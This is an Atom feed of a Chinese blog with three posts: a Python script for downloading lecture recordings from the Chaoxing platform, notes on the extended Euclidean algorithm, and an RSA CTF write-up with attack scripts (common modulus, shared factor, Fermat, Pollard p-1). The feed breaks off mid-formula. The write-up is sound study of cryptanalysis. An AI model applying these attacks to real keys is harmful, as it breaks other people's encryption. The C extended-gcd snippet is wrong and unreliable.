<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>mercer</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://mercer5.github.io/"/>
  <updated>2022-04-14T06:42:24.181Z</updated>
  <id>https://mercer5.github.io/</id>
  
  <author>
    <name>mercer</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XDU_chaoxing_vedio_download</title>
    <link href="https://mercer5.github.io/2022/04/14/XDU-chaoxing-vedio-download/"/>
    <id>https://mercer5.github.io/2022/04/14/XDU-chaoxing-vedio-download/</id>
    <published>2022-04-14T06:35:36.000Z</published>
    <updated>2022-04-14T06:42:24.181Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一切为了下载垃圾学校放在垃圾超星上的垃圾录播</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li><p>咱先到超星录播f12抓个包, 在network那里搜一下<code>m3u8</code> </p><p><img src="image-20220413110736942.png" alt="image-20220413110736942"></p><ul><li>下面两个 <code>playback.m3u8</code> 就是视频中的一大一小两个视频</li><li>重点在箭头指向的那个</li></ul></li><li><p>这是个get传参, 将payload复制出来</p><p><img src="image-20220413110900303.png" alt="image-20220413110900303"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"type"</span>:<span class="string">"2"</span>,</span><br><span class="line"><span class="attr">"videoPath"</span>:</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="attr">"pptVideo"</span>:<span class="string">"..."</span>,</span><br><span class="line">         <span class="attr">"mobile"</span>:<span class="string">"..."</span>,</span><br><span class="line">         <span class="attr">"teacherTrack"</span>:<span class="string">"..."</span>,</span><br><span class="line">         <span class="attr">"studentFull"</span>:<span class="string">"..."</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>pptVideo: ppt视图(我们所看到的小的那个视频)</li><li>mobile: 这个很神奇,会在teacherTrack和pptVideo之间来回跳转, 害挺智能的(我决定以后都下这个了)</li><li>teacherTrack: 跟踪老师视图(就是我们所看到的大的视频)</li><li>studentFull: 对准学生的监控录像XD</li></ul></li><li><p>将复制出来的东西放到 <code>vedio.json</code> 里</p><p><img src="image-20220414142405437.png" alt="image-20220414142405437"></p></li></ol><h2 id="下载"><a href="#下载" class="headerlink" title="　下载"></a>　下载</h2><p>目录结构如下:</p><p><img src="image-20220414142428275.png" alt="image-20220414142428275"></p><p>下面是 <code>vedio_download.py</code> 的代码, 根据需要修改 var下的变量</p><ul><li>saveName: 保存的文件名</li><li>vedioType: json信息中的4中类型,默认mobile</li><li>threadNumber: 线程数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,json,time,threading,os</span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> var</span></span><br><span class="line">saveName = <span class="string">"test"</span></span><br><span class="line">vedioType = <span class="string">"mobile"</span></span><br><span class="line">threadNumber = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># func</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrlFromJson</span><span class="params">(vedioType)</span>:</span></span><br><span class="line">    f = open(<span class="string">'vedio.json'</span>,<span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">return</span> json.load(f).get(<span class="string">"videoPath"</span>).get(vedioType)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPageToFile</span><span class="params">(url)</span>:</span></span><br><span class="line">    tmpUrl = url[:url.rfind(<span class="string">'/'</span>)+<span class="number">1</span>]</span><br><span class="line">    lst_all = requests.get(url).text.split(<span class="string">'\n'</span>)</span><br><span class="line">    matchList = [i.strip(<span class="string">'\r'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> lst_all <span class="keyword">if</span> i.find(<span class="string">'.ts'</span>)!=<span class="number">-1</span>]</span><br><span class="line">    lst = [tmpUrl+i+<span class="string">'\n'</span> <span class="keyword">for</span> i <span class="keyword">in</span> matchList]</span><br><span class="line">    f = open(<span class="string">'payload.m3u8'</span>,<span class="string">'w'</span>)</span><br><span class="line">    f.writelines(lst)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadTF</span><span class="params">(urls)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(urls)):</span><br><span class="line">        start = time.time()</span><br><span class="line">        ts_url = urls[i]</span><br><span class="line">        ts_name = ts_url.split(<span class="string">'/'</span>)[<span class="number">-1</span>].split(<span class="string">'_'</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(ts_url,stream=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">'error:&#123;&#125;'</span>.format(e.args))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        ts_path = <span class="string">"temp/&#123;:0&gt;4&#125;.ts"</span>.format(ts_name)</span><br><span class="line">        <span class="keyword">with</span> open(ts_path,<span class="string">"wb+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">1024</span>):</span><br><span class="line">                <span class="keyword">if</span> chunk:</span><br><span class="line">                    f.write(chunk)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(<span class="string">'&#123;&#125;_&#123;&#125;_time cost: &#123;&#125;'</span>.format(threading.current_thread().name,ts_path,end-start))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createThread</span><span class="params">(threadNumber,urls)</span>:</span></span><br><span class="line">    cnt = len(urls)//threadNumber</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threadNumber):</span><br><span class="line">        tmp_urls = urls[i*cnt:i*cnt+cnt]</span><br><span class="line">        t = threading.Thread(target=downloadTF,args=[tmp_urls,],name=str(i))</span><br><span class="line">        t.start()</span><br><span class="line">        threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line">url_m3u8 = getUrlFromJson(vedioType)</span><br><span class="line">getPageToFile(url_m3u8)</span><br><span class="line">cwd = os.getcwd()</span><br><span class="line">os.makedirs(os.path.join(cwd,<span class="string">'temp'</span>),exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'payload.m3u8'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        urls = f.readlines()</span><br><span class="line"></span><br><span class="line">createThread(threadNumber,urls)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'download finished ...'</span>)</span><br><span class="line">print(<span class="string">'start to merge all the file ...'</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">r"copy /b .\temp\*.ts .\&#123;&#125;.ts"</span>.format(saveName)</span><br><span class="line">os.system(cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear</span></span><br><span class="line">cmd = <span class="string">'rmdir /s/q temp'</span></span><br><span class="line">os.system(cmd)</span><br><span class="line">cmd = <span class="string">'del /q payload.m3u8'</span></span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;一切为了下载垃圾学校放在垃圾超星上的垃圾录播&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h2&gt;&lt;ol&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="杂七杂八" scheme="https://mercer5.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="XDU" scheme="https://mercer5.github.io/tags/XDU/"/>
    
      <category term="tools" scheme="https://mercer5.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>欧几里德算法及扩展算法</title>
    <link href="https://mercer5.github.io/2022/01/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%B7%E7%AE%97%E6%B3%95%E5%8F%8A%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/"/>
    <id>https://mercer5.github.io/2022/01/26/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%B7%E7%AE%97%E6%B3%95%E5%8F%8A%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/</id>
    <published>2022-01-26T09:02:05.436Z</published>
    <updated>2020-08-24T15:30:09.857Z</updated>
    
    <content type="html"><![CDATA[<h1 id="欧几里德算法及扩展算法"><a href="#欧几里德算法及扩展算法" class="headerlink" title="欧几里德算法及扩展算法"></a>欧几里德算法及扩展算法</h1><h2 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h2><p>又称碾转相除法，用于计算两整数a, b 的最大公约数。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">int</span> max(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">int</span> c;</span><br><span class="line"><span class="attribute">c</span> = a % b;</span><br><span class="line"><span class="attribute">while</span> (c != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">a</span> = b;</span><br><span class="line"><span class="attribute">b</span> = c;</span><br><span class="line"><span class="attribute">c</span> = a % b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理依赖于下面定理：</p><blockquote><p>两个整数的最大公约数等于其中较小的那个数和两数相除的最大公约数。</p></blockquote><p>证明：<br>设 a = kb +r， 则r = a mod b<br>假设d为a, b的一个公约数<br>r = kb - a<br>r/d = kb/d - a/d<br>可知r/d为整数，因此d也是a, b, a%b的公约数， 则得证。</p><h2 id="欧几里得扩展算法"><a href="#欧几里得扩展算法" class="headerlink" title="欧几里得扩展算法"></a>欧几里得扩展算法</h2><p>因为在学习RSA的共模攻击，所以复习一下欧几里得算法，但是关键是欧几里得算法扩展：</p><blockquote><p>如果gcd(a, b) = c，则存在x, y，使得c = ax + by。</p></blockquote><p>证明：</p><p>　　设 <code>a&gt;b</code><br>　　当 <code>b = 0</code>时，<code>gcd(a, b) = a</code>，此时<code>x = 1</code>, <code>y = 0</code>。<br>　　假设 <code>a*x1 + b*y1 = gcd(a, b)</code><br>　　则 <code>b*x2 + (a mod b)*y2 = gcd(b, a mod b)</code><br>　　根据 <code>gcd(a, b) = gcd(b, a mod b)</code>　　<br>　　可得 <code>a*x1 + b*y1 = b*x2 + (a mod b)*y2</code>　　<br>　　因为 <code>a mod b = a - (a/b)*b</code> //这里 ‘/‘ 是整除　　<br>　　所以 <code>a*x1 + b*y1 = b*x2 + (a - (a/b)*b)*y2</code><br>　　　　　　　　　　　<code>= b*x2 + a*y2 - (a/b)*b*y2</code><br>　　　　　　 <code>gcd(a, b) = a*y2 + b*(x2 - (a/b)*y2)</code><br>　　对比 <code>a*x1 + b*y1 = gcd(a, b)</code>　　<br>　　发现 <code>x1 = y2</code><br>　　　 　 <code>y1 = x2 - (a/b)*y2</code>　　</p><p>算法代码如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> e<span class="constructor">_gcd(<span class="params">int</span> <span class="params">a</span>, <span class="params">int</span> <span class="params">b</span>, <span class="params">int</span> <span class="params">x</span>, <span class="params">int</span> <span class="params">y</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b<span class="operator"> == </span><span class="number">0</span>)&#123;</span><br><span class="line">        x = <span class="number">1</span>;</span><br><span class="line">        y = <span class="number">0</span>;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> ans = e<span class="constructor">_gcd(<span class="params">b</span>, <span class="params">a</span>%<span class="params">b</span>, <span class="params">x</span>, <span class="params">y</span>)</span>;</span><br><span class="line">    <span class="built_in">int</span> t = x;</span><br><span class="line">    x = y;</span><br><span class="line">    y = x - (a/b)*y;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="乘法逆元"><a href="#乘法逆元" class="headerlink" title="乘法逆元"></a>乘法逆元</h2><p><strong>什么叫乘法逆元？</strong></p><p>形如<code>a*x mod b ≡ 1</code><br>我们称x是a关于f的乘法逆元，还有另一种表达式：</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a*<span class="symbol">x</span> + b*<span class="symbol">y</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>也就是<code>gcd(a, b) = 1</code></p><p>在RSA共模攻击中，求乘法逆元函数如下</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def egcd(<span class="keyword">a</span>, b):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">a</span> == <span class="number">0</span>:</span><br><span class="line">          <span class="literal">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % <span class="keyword">a</span>, <span class="keyword">a</span>)</span><br><span class="line">        <span class="literal">return</span> (g, x - (b<span class="comment"> // a) * y, y)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;欧几里德算法及扩展算法&quot;&gt;&lt;a href=&quot;#欧几里德算法及扩展算法&quot; class=&quot;headerlink&quot; title=&quot;欧几里德算法及扩展算法&quot;&gt;&lt;/a&gt;欧几里德算法及扩展算法&lt;/h1&gt;&lt;h2 id=&quot;欧几里得算法&quot;&gt;&lt;a href=&quot;#欧几里得算法&quot; cla
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>RSA大礼包_wp</title>
    <link href="https://mercer5.github.io/2022/01/07/RSA%E5%A4%A7%E7%A4%BC%E5%8C%85-wp/"/>
    <id>https://mercer5.github.io/2022/01/07/RSA%E5%A4%A7%E7%A4%BC%E5%8C%85-wp/</id>
    <published>2022-01-07T04:47:50.000Z</published>
    <updated>2022-04-14T06:37:13.496Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RSA大礼包-wp"><a href="#RSA大礼包-wp" class="headerlink" title="RSA大礼包_wp"></a>RSA大礼包_wp</h1><h2 id="frame0-4"><a href="#frame0-4" class="headerlink" title="frame0,4"></a>frame0,4</h2><p>Common Modulus Attack</p><p><strong>前提条件</strong></p><p>模数一样,待加密的明文一样,公钥互素</p><ul><li>Alice: $(n_1,e_1,m_1)$, Bob: $(n_2,e_2,m_2)$</li><li>$n_1 = n_2$</li><li>$m_1 = m_2$</li><li>$gcd(e_1,e_2) = 1$ </li></ul><p><strong>攻击原理</strong></p><script type="math/tex; mode=display">存在 (s,t) \quad s.t.\ e_1s+e_2t=gcd(e_1,e_2)=1 \\\\c_1^s \cdot c_2^t \equiv (m^{e_1})^s \cdot (m^{e_2})^t \equiv m^{e_1s+e_2t} \equiv m \pmod n</script><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(e1, e2, n, c1, c2)</span>:</span></span><br><span class="line">    <span class="comment"># 调用扩展的欧几里得算法函数</span></span><br><span class="line">    g, s, t = gcdext(e1, e2)</span><br><span class="line">    <span class="comment"># 求模反元素</span></span><br><span class="line">    <span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">        s = -s</span><br><span class="line">        c1 = inverse(c1,n)</span><br><span class="line">    <span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">        t = -t</span><br><span class="line">        c2 = inverse(c2,n)</span><br><span class="line">    <span class="keyword">return</span> pow(c1,s,n)*pow(c2,t,n)%n</span><br></pre></td></tr></table></figure><p><strong>结果</strong></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b'<span class="symbol">\x</span>98vT2<span class="symbol">\x</span>10<span class="symbol">\x</span>ab<span class="symbol">\x</span>cd<span class="symbol">\x</span>ef<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00My secre'</span><br></pre></td></tr></table></figure><h2 id="frame1-18"><a href="#frame1-18" class="headerlink" title="frame1,18"></a>frame1,18</h2><p>模不互素攻击</p><p><strong>前提条件</strong></p><ul><li>$gcd(n1,n2)!=1$</li><li>$n_1 \neq n_2$</li></ul><p><strong>攻击原理</strong></p><script type="math/tex; mode=display">最大公因数获取其中一个大素数: p = gcd(n1,n2) \\\\n除p获取另一个大素数: q_i = n_i \div p \quad (i=1 \ or \  2) \\\\phi_i(n) = (q_i-1)(p-1) \\\\d_i = inverse(e_i,n_i) \\\\m_i \equiv c_i^{d_i} \pmod n_i</script><p><strong>结果</strong></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b'<span class="symbol">\x</span>98vT2<span class="symbol">\x</span>10<span class="symbol">\x</span>ab<span class="symbol">\x</span>cd<span class="symbol">\x</span>ef<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>0b<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00. Imagin'</span><br><span class="line">b'<span class="symbol">\x</span>98vT2<span class="symbol">\x</span>10<span class="symbol">\x</span>ab<span class="symbol">\x</span>cd<span class="symbol">\x</span>ef<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\n</span><span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00m A to B'</span><br></pre></td></tr></table></figure><h2 id="frame10"><a href="#frame10" class="headerlink" title="frame10"></a>frame10</h2><p>Fermat’s factorization method</p><p><strong>前置</strong></p><script type="math/tex; mode=display">\because \forall 奇数n = ab = x^2-y^2 \\\\\therefore n = ab = (x+y)(x-y) \\\\</script><script type="math/tex; mode=display">             a = x+y \\\\             b = x-y</script><p><strong>算法</strong></p><script type="math/tex; mode=display">y^2 = x^2 - n >= 0 \\\\\therefore x^2>=n ,即: x>=\sqrt n\\\\\therefore 可以从x = \sqrt n 开始,计算x^2-n为完全平方数即可求出x,y \\\\然后求得a,b</script><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fermat_factorization</span><span class="params">(num)</span>:</span></span><br><span class="line">    x,flag_x = iroot(num,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> pow(x,<span class="number">2</span>)&lt;num:</span><br><span class="line">        x+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        temp = pow(x,<span class="number">2</span>) - num</span><br><span class="line">        y,flag_y = iroot(temp,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> flag_y:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        x+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> int((x+y)),int((x-y))</span><br></pre></td></tr></table></figure><p><strong>结果</strong></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">b'<span class="symbol">\x</span>98vT2<span class="symbol">\x</span>10<span class="symbol">\x</span>ab<span class="symbol">\x</span>cd<span class="symbol">\x</span>ef<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>08<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00will get'</span><br></pre></td></tr></table></figure><h2 id="frame2-9-16"><a href="#frame2-9-16" class="headerlink" title="frame2,9,16"></a>frame2,9,16</h2><p>Pollard’s p-1 algorithm</p><p><strong>前置</strong></p><p>费马小定理:  若$p$是素数,且$p \nmid a$, 则$a^{p-1} \equiv 1 \pmod p$</p><p>B-Smooth数: 如果一个整数的所有素因子都不大于B,则称该整数为B-Smooth数</p><p><strong>原理</strong></p><p>条件</p><ul><li>设大整数的一个因子是p, p-1需要是B-Smooth的</li></ul><script type="math/tex; mode=display">设p-1是B-Smooth的,即p-1 = p_1 p_2\cdots p_n \ (\forall 1 \leq i \leq n,p_i \leq B) \\\\若p_i两两不同,则p_1 p_2\cdots p_n \mid B! \\\\即 (p-1) \mid B! , B! = k(p-1) \\\\\therefore a^{B!} \equiv a^{k(p-1)} \equiv 1 \pmod p \\\\</script><p>分解过程</p><script type="math/tex; mode=display">假设n = pq\\\\计算gcd = gcd(a^{B!}-1,n) \\\\如果 0 < gcd < n, 则gcd为n的一个因子</script><p><strong>算法</strong></p><ul><li><p>设置$ a = 2$(或者其他方便的数字)</p></li><li><p>循环$j = 2,3,\cdots B$</p><blockquote><p>若$p_1,p_2,\cdots,p_n$这些素数是随机在小s于B的数中选的,那么最大的素数大概率要大于0.8B</p><p>因此在$j&lt;0.8B$之前不计算gcd,可以节省时间</p></blockquote><ul><li>令$a \equiv a^j \pmod 